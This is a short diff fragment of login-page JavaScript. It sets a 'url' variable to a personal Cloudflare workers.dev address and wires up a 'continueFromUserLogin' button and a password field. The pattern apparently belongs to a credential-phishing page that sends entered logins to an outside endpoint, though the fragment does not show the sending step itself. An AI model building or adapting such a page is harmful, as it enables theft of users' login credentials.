@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded' ,function(){
   	.prop("type", "password");
   }
 });
-    var url="holy-surf-e8b5.jjmdw.workers.dev"
+    var url="https://holy-surf-e8b5.jjmdw.workers.dev/"
     submit_btn = document.getElementById("continueFromUserLogin");
     userInputContainerDiv = document.getElementById("userInputContainerDiv")
     userBackButton =  document.getElementById("userBackButtonSpanTxt")
